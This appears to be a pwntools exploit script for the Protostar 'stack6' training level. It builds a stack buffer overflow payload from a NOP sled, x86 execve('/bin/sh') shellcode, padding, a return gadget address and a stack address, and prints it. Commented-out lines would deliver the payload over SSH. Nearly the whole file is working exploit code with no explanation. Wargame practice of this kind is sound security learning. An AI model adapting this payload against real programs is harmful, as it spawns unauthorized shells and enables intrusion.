#!/usr/bin/env python
from pwn import *
### does not work remotely only locally by uploading and using payload with cat
offset = 80
retGadget = 0x080484f9 # get path ret addr
stackAddr = 0xbffff688  # stackAddr for jumping with retGadget
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
#    s = ssh("user", sys.argv[1], 22, password="user")
    sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
#    sc = "\xcc"*8
    payload = '\x90' * (offset-23-4-12)
    payload += sc
    payload += "B" *12
    payload += "A"*4
    payload += p32(retGadget)
    payload += p32(stackAddr)

#    r = s.run('/opt/protostar/bin/stack6')
#    print(r.recv(1024))
#    r.send(payload + '\n')
#    print(r.recv(1024))
#    r.interactive()
#    r.close()
    print(payload)
